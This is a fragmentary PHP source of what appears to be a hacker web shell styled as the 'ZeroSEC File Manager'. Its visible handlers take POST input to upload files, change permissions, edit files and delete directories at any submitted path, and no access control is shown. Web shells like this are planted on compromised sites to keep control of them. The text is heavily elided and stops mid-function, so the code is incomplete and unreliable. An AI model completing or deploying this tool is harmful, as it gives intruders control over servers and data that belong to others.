...
<title>ZeroSEC File Manager</title>
<style>
body{
...
<BODY>
<H1><center>ZeroSEC File Manager</center></H1>
<H4><center>Perfect With You BABY</center></H4>
...
echo '<font color="green">Upload File done</font><br />';
}else{
echo '<font color="red">Error to upload</font><br />';
}
}
...
echo '<font color="green">Mengubah Permission Done</font><br />';
}else{
echo '<font color="red">Mengubah Pemission Error</font><br />';
}
}
...
echo '<font color="red">Error to edit</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
...
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Directory Successful</font><br />';
}else{
...
echo '<center><br />ZeroSEC</font><center>
</BODY>
</HTML>';
function perms($file){
